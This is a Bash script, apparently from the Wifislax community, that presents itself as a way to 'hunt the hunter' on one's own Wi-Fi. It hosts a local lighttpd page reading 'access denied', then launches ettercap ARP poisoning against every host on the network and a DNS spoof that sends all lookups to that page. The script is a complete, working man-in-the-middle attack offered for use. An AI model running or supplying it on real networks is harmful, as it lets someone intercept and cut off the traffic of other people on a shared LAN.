#!/bin/bash
 
####################
#
# El cazador cazado v0.1
#
# Por geminis_demon para Wifislax
#
##################################
#
# A finalidade deste script e assustar o atacante que esta se conectando
# a nossa rede sem a nossa permissao, e impedir o acesso a internet.
#
# O script ira configurar um pequeno servidor web na porta 80, que sera
# um Index.html contendo a mensagem que queremos o nosso atacante veja,
# Criara um portal cativo envenenando o cache ARP e falsificando
# resolucoes de DNS, de modo que quando qualquer maquina que tenha acesso
# a nossa rede ao tentar acessar qualquer pagina da web,  sera redirecionado para um
# Servidor local, desta forma, vamos fazer com que o nosso atacante nao possa acessar
# Internet, e ver a mensagem que deixou.
#
######################################################################################
 
# Directorio temporal
TMP="/tmp/cazador-cazado$$"
 
# Creamos directorio
mkdir -p "$TMP/www"
 
# Crear archivo de configuración de lighhtpd
makeconfig() {
cat << EOF >"$TMP/lighttpd.cfg"
# lighttpd configuration file
server.modules       = ("mod_access","mod_accesslog","mod_rewrite","mod_redirect")
index-file.names     = ( "index.html")
mimetype.assign      = (".html" => "text/html")
url.rewrite-once     = ("^/(.*)$" => "/index.html")
url.redirect         = ("^/$" => "/index.html")
server.errorlog      = "$TMP/lighttpd.log"
server.document-root = "$TMP/www"
server.pid-file      = "$TMP/lighttpd.pid"
accesslog.filename   = "$TMP/lighttpd.log"
EOF
}
 
 
# Crear el index por defecto
makeindex() {
cat << EOF >"$TMP/www/index.html"
<html>
  <head>
    <title>ACCESSO NEGADO</title>
  </head>
  <body BGCOLOR="BLACK" TEXT="RED">
    <table WIDTH="100%" HEIGHT="100%"><tr>
      <td VALIGN="MIDDLE" ALIGN="CENTER">
       <h1><b>VOCE ESTA INVADINDO UMA REDE PRIVADA .SCANEANDO IP DO INVASOR.</b></h1>
      </td></tr>
    </table>  
  </body>
</html>
EOF
}
 
# Ponemos en marcha el servidor y lanzamos el ataque
attack() {
echo ""
echo "[1;34m --> Poniendo en marcha el servidor web..."
echo "[1;31m"
lighttpd -f "$TMP/lighttpd.cfg"
sleep 1
echo "[1;34m --> Poniendo en marcha envenenamiento ARP..."
echo "[1;31m"
INTERFACE="$(ip route show|grep ' src '|cut -d' ' -f3)"
xterm -title "ARP Poisoning" -fg blue -e "ettercap -TM arp:remote // // -i $INTERFACE -P autoadd" & ETTER_1=$!
sleep 1
echo "[1;34m --> Poniendo en marcha falsificación de resoluciones DNS..."
echo "[1;31m"
SERVER="$(ip route show|grep ' src '|cut -d' ' -f12)"
echo "* A $SERVER" >/etc/ettercap/etter.dns
xterm -title "DNS Spoofing" -fg blue -e "ettercap -Tq -i $INTERFACE -P dns_spoof" & ETTER_2=$!
sleep 1
echo "[0m --------------------------------------------------------------------------- "
echo " [1;33mEl ataque se está ejecutando!"
echo " Pulsa la tecla \"Enter\" para detener el ataque y salir.[0m"
read junk
sleep 1
clear
 
# Hacemos limpieza y salimos
kill $(cat "$TMP/lighttpd.pid" 2>/dev/null) $ETTER_1 $ETTER_2 2>/dev/null
rm -rf "$TMP"
exit
}
 
# Leer opción
readoption() {
cat << EOF
 [1;34m
 Elige una opción:
 
 1) Continuar
 2) Editar index.html
 3) Visualizar index.html
 0) Salir
 
EOF
echo -n " ?> "
read RESP
case $RESP in
        1 ) sleep 1; clear; banner; attack;;
        2 ) sleep 1; (kwrite "$TMP/www/index.html"||mousepad "$TMP/www/index.html") & banner; readoption;;
        3 ) sleep 1; firefox "$TMP/www/index.html" & banner; readoption;;
        0 ) sleep 1; clear; rm -rf "$TMP"; exit;;
        * ) sleep 1; echo "[1;34m
Opción incorrecta";sleep 1; banner; readoption;;
esac
}
 
# Banner de bienvenida
banner() {
clear
sleep 0.1s; echo " [1;34m                                                                    "
sleep 0.1s; echo " ####### #           #####     #    #######    #    ######  ####### ######  "
sleep 0.1s; echo " #       #          #     #   # #        #    # #   #     # #     # #     # "
sleep 0.1s; echo " #       #          #        #   #      #    #   #  #     # #     # #     # "
sleep 0.1s; echo " #####   #          #       #     #    #    #     # #     # #     # ######  "
sleep 0.1s; echo " #       #          #       #######   #     ####### #     # #     # #   #   "
sleep 0.1s; echo " #       #          #     # #     #  #      #     # #     # #     # #    #  "
sleep 0.1s; echo " ####### #######     #####  #     # ####### #     # ######  ####### #     # "
sleep 0.1s; echo "                                                                            "
sleep 0.1s; echo "                #####     #    #######    #    ######  #######              "
sleep 0.1s; echo "               #     #   # #        #    # #   #     # #     #              "
sleep 0.1s; echo "               #        #   #      #    #   #  #     # #     #              "
sleep 0.1s; echo "               #       #     #    #    #     # #     # #     #              "
sleep 0.1s; echo "               #       #######   #     ####### #     # #     #              "
sleep 0.1s; echo "               #     # #     #  #      #     # #     # #     #              "
sleep 0.1s; echo "                #####  #     # ####### #     # ######  #######              "
sleep 0.1s; echo "                                                                        [0m"
echo " ---------------------------------------------------------------------------
[1;33mA finalidade deste script e assustar o atacante que esta se conectando
a nossa rede sem a nossa permissao, e impedir o acesso a internet.
 
O script ira configurar um pequeno servidor web na porta 80, que sera
Index.html um contendo a mensagem que queremos que o nosso atacante veja,
Criara um portal cativo envenendo o cache ARP e falsificando
resolucoes de DNS, de modo que quando qualquer maquina que tenha acesso
a nossa rede ao tentar acessar qualquer pagina da web, sera redirecionado para um
Servidor local, desta forma, vamos fazer com nosso atacante nao possa acessar
Internet, e ver a mensagem que deixou.[0m
--------------------------------------------------------------------------- "
}
 
# Se inica el programa
makeconfig && makeindex && banner && readoption
